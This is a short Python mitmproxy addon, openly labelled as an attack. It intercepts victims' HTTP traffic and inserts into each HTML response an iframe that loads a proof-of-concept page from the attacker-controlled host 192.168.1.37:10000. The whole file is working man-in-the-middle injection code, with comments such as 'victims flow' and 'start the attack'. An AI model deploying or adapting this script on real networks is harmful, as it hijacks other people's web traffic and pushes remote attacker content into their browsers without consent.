#!/usr/bin/env python
# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
from mitmproxy import ctx, http
import argparse

class Injector:		# Class for injection
    def __init__(self, path):	
        self.path = path

# Function to inject iframe on victims flow (change iframe variable, line 20)
    def response(self, flow: http.HTTPFlow) -> None:	
        if self.path:
            html = BeautifulSoup(flow.response.content, "html.parser")
            print(self.path)
            print(flow.response.headers["content-type"])
            if flow.response.headers["content-type"] == 'text/html':
                print(flow.response.headers["content-type"])
                iframe = html.new_tag(
                    "<iframe src='http://192.168.1.37:10000/poc'></iframe>") # html iframe
                html.body.insert(0, iframe)
                flow.response.content = str(html).encode("utf8")
               
def start():	# start the attack
    parser = argparse.ArgumentParser()
    parser.add_argument("path", type=str)
    args = parser.parse_args()
    return Injector(args.path)
